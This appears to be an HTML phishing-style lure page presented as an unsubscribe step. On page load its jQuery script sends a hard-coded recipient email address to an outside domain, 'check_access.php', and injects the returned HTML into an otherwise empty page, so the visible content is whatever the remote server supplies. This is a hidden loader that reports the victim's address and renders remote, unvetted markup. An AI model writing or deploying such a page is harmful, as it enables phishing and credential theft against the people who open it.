<script>
     var unsubscribe = "user@example.com";
</script>
<!DOCTYPE html>
<html>
<head>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
			var formData = {
					email: unsubscribe
			};
            $.ajax({
                url: "http://tgshp.araimalo.com/check_access.php?unsubscribe",
                type: "POST",
				data: formData,
                dataType: "html",
                success: function(response) {
                    $("#xlc").html(response);   
                },
                
            });
        });
    </script>
</head>
<body>
    <div id="xlc"></div>
</body>
</html>
